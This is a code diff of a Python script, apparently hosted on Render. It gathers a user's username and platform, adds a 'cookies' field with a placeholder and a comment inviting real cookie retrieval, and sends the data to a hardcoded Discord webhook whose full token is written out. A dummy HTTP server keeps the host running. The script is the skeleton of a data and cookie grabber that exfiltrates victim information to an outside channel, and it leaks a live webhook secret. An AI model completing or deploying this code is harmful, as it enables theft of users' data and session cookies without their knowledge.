@@ -1,49 +1,63 @@
 import os
-import threading
-from http.server import SimpleHTTPRequestHandler, HTTPServer
-from discord_webhook import DiscordWebhook
+import platform
+from http.server import BaseHTTPRequestHandler, HTTPServer
+from discord import SyncWebhook
 
-def run_dummy_server():
-    """Start a dummy HTTP server to bind to a port."""
-    port = int(os.environ.get("PORT", 5000))  # Use the port Render assigns or default to 5000
-    server = HTTPServer(("0.0.0.0", port), SimpleHTTPRequestHandler)
-    print(f"Dummy server running on port {port}")
-    server.serve_forever()
-
-# Start the dummy server in a separate thread
-threading.Thread(target=run_dummy_server, daemon=True).start()
-
-# Webhook URL (replace with your actual webhook URL)
+# Webhook URL
 WEBHOOK_URL = "https://discord.com/api/webhooks/1330720300307845170/f2Xm40QZH2CNbI4hbL0FRr66hJjmU92DXbyDcp0Z970RbPL9H4Nd5WzY06xiF8nPGGMp"
 
+# Function to send a message to Discord webhook
 def send_to_discord(message):
-    """Send a message to Discord via the webhook."""
     try:
-        webhook = DiscordWebhook(url=WEBHOOK_URL, content=message)
-        response = webhook.execute()
-        if response.status_code == 200:
-            print("Message sent to Discord.")
-        else:
-            print(f"Failed to send message to Discord. Status code: {response.status_code}")
+        webhook = SyncWebhook.from_url(WEBHOOK_URL)
+        webhook.send(content=message)
+        print("Message sent to webhook successfully.")
     except Exception as e:
         print(f"Error sending webhook: {e}")
 
-def main():
-    """Main script logic."""
-    print("Starting the process...")
+# Function to collect and send user data
+def collect_user_data():
     try:
-        # Simulated user info (replace with actual data collection if applicable)
         user_info = {
             "username": os.getenv("USER", "Unknown User"),
-            "platform": os.getenv("PLATFORM", "Linux"),
+            "platform": platform.system(),
         }
-        print(f"User information retrieved successfully: {user_info}")
+        cookies = "Dummy cookies data"  # Replace with actual cookie retrieval if needed
+        user_info["cookies"] = cookies
 
-        # Send user info to Discord webhook
+        # Send the data to Discord
         send_to_discord(f"User Info: {user_info}")
-
     except Exception as e:
-        print(f"Error: {e}")
+        print(f"Error collecting user data: {e}")
+
+# Dummy HTTP server for Render health checks
+class DummyServer(BaseHTTPRequestHandler):
+    def do_GET(self):
+        if self.path == "/":
+            self.send_response(200)
+            self.send_header("Content-type", "text/plain")
+            self.end_headers()
+            self.wfile.write(b"Server is running.")
+        else:
+            self.send_response(404)
+            self.end_headers()
+
+def start_dummy_server():
+    try:
+        server_address = ("0.0.0.0", 8080)  # Bind to all interfaces
+        httpd = HTTPServer(server_address, DummyServer)
+        print("Starting dummy server on port 8080...")
+        httpd.serve_forever()
+    except KeyboardInterrupt:
+        print("Shutting down the server.")
+    except Exception as e:
+        print(f"Error starting server: {e}")
+
+# Main function
+def main():
+    print("Starting the process...")
+    collect_user_data()
+    start_dummy_server()
 
 if __name__ == "__main__":
     main()
